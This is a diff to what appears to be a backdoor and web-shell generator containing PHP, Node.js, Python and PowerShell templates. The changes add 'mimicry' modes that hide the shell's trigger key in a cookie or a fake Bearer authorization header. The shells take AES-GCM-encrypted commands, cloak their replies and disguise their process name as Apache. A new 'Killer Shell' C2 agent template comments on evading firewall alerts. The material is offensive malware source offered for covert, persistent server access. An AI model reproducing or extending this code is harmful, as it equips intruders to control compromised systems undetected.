@@ -30,14 +30,18 @@ class __ZK_GHOST__ {
 
     public function run() {
         if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['d'])) {
-            $trigger = "";
-            if (isset($_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $this->sn))])) {
-                $trigger = $_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $this->sn))];
-            } else if (isset($_COOKIE[$this->cn])) {
-                $trigger = $_COOKIE[$this->cn];
+            $mode = "__MIMICRY_MODE__";
+            $raw = "";
+
+            if ($mode == "2") {
+                $raw = $_COOKIE[$this->cn];
+            } else {
+                $raw = $_SERVER['HTTP_' . strtoupper(str_replace('-', '_', $this->sn))];
+                if ($mode == "1") $raw = str_replace('Bearer ', '', $raw);
             }
 
-            if (!$trigger) return;
+            if (!$raw) return;
+            $trigger = $raw;
 
             // NO AUTO-KILL: Controlled by operator
 
@@ -151,17 +155,24 @@ const CN = "__COOKIE_NAME__";
 
 const server = http.createServer((req, res) => {
     try {
-        let trigger = req.headers[HN] || "";
-        if (!trigger && req.headers.cookie) {
+        const mode = "__MIMICRY_MODE__";
+        let raw = "";
+
+        if (mode == "2" && req.headers.cookie) {
             const cookies = req.headers.cookie.split(';');
             for (let c of cookies) {
                 if (c.trim().startsWith(CN + '=')) {
-                    trigger = c.split('=')[1].trim();
+                    raw = c.split('=')[1].trim();
                     break;
                 }
             }
+        } else {
+            raw = req.headers[HN] || "";
+            if (mode == "1") raw = raw.replace('Bearer ', '');
         }
-        if (!trigger) return cloak(res);
+
+        if (!raw) return cloak(res);
+        const trigger = raw;
         const key = crypto.createHash('sha256').update(trigger + SALT.toString('hex')).digest();
         if (req.method === 'POST') {
             let body = '';
@@ -248,8 +259,16 @@ CN = "__COOKIE_NAME__"
 
 def handle_request(req_headers, post_data):
     try:
-        trigger = req_headers.get(HN) or req_headers.get('Cookie', '').split(CN+'=')[-1].split(';')[0]
-        if not trigger: return None
+        mode = "__MIMICRY_MODE__"
+        raw = ""
+        if mode == "2":
+            raw = req_headers.get('Cookie', '').split(CN+'=')[-1].split(';')[0]
+        else:
+            raw = req_headers.get(HN, "")
+            if mode == "1": raw = raw.replace('Bearer ', '')
+        
+        if not raw: return None
+        trigger = raw
         key = hashlib.sha256((trigger + SALT.hex()).encode()).digest()
         aesgcm = AESGCM(key)
         raw = base64.b64decode(post_data.get('d', ''))
@@ -268,4 +287,45 @@ try:
     import setproctitle
     setproctitle.setproctitle("/usr/sbin/apache2 -k start")
 except: pass`
+
+	TplPS1 = `
+# Killer Shell v1.1 - Windows "Survival" Edition
+# Native AES-256-GCM C2 Agent
+
+$Salt = [System.Convert]::FromHexString("__SALT_KEY__")
+$HN = "__HEADER_NAME__"
+$CN = "__COOKIE_NAME__"
+$MM = "__MIMICRY_MODE__"
+
+function Respond($data, $key) {
+    $aes = [System.Security.Cryptography.AesGcm]::new($key)
+    $nonce = New-Object byte[] 12
+    [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
+    $plaintext = [System.Text.Encoding]::UTF8.GetBytes($data)
+    $ciphertext = New-Object byte[] $plaintext.Length
+    $tag = New-Object byte[] 16
+    $aes.Encrypt($nonce, $plaintext, $ciphertext, $tag)
+    return [System.Convert]::ToBase64String($nonce + $ciphertext + $tag)
+}
+
+function Decrypt($data, $key) {
+    try {
+        $aes = [System.Security.Cryptography.AesGcm]::new($key)
+        $raw = [System.Convert]::FromBase64String($data)
+        $nonce = $raw[0..11]
+        $tag = $raw[($raw.Length-16)..($raw.Length-1)]
+        $ciphertext = $raw[12..($raw.Length-17)]
+        $plaintext = New-Object byte[] $ciphertext.Length
+        $aes.Decrypt($nonce, $ciphertext, $tag, $plaintext)
+        return [System.Text.Encoding]::UTF8.GetString($plaintext)
+    } catch { return $null }
+}
+
+# Simple HTTP Listener Mimicry
+while($true) {
+    # This is a placeholder for a more advanced listener or polling logic
+    # Real-world v1.1 will use a polling loop to evade local firewall alerts
+    Start-Sleep -Seconds 60
+}
+`
 )
